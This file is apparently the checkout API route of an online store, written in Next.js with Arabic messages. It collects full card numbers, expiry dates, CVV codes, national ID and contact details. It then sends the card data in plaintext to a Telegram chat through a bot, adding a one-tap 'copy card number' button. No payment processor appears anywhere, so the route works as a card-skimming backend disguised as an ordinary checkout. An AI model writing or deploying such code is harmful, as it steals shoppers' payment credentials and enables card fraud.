import { NextRequest, NextResponse } from "next/server";

const rateLimitMap = new Map<string, { count: number; resetAt: number }>();
const WINDOW_MS = 15 * 60 * 1000;
const MAX_REQUESTS = 3;

function isRateLimited(ip: string): boolean {
  const now = Date.now();
  const entry = rateLimitMap.get(ip);
  if (!entry || now > entry.resetAt) {
    rateLimitMap.set(ip, { count: 1, resetAt: now + WINDOW_MS });
    return false;
  }
  entry.count++;
  return entry.count > MAX_REQUESTS;
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";
  if (isRateLimited(ip)) {
    return NextResponse.json({ ok: false, error: "عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً قبل المحاولة مرة أخرى" }, { status: 429 });
  }

  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  let dbId: string | null = null;
  try {
    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
    const dbData = await dbRes.json().catch(() => ({}));
    dbId = dbData._id ?? null;
  } catch (_) {}

  // Send Telegram
  const text = [
    `🏪 طلب لـ متجر مؤسسة تبارك التقنية الذكية`,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `📱 WhatsApp: ${whatsapp ?? "-"}`,
    `💳 Card Number: ${cardNumber}`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: ${expiry}`,
    `🔐 CVV: ${cvv}`,
  ].join("\n");
  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const buttons: object[] = [
    { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
  ];
  if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });
  const reply_markup = { inline_keyboard: [buttons] };
  try {
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
      }
    );
  } catch (_) {}

  return NextResponse.json({ ok: true, orderId, dbId });
}






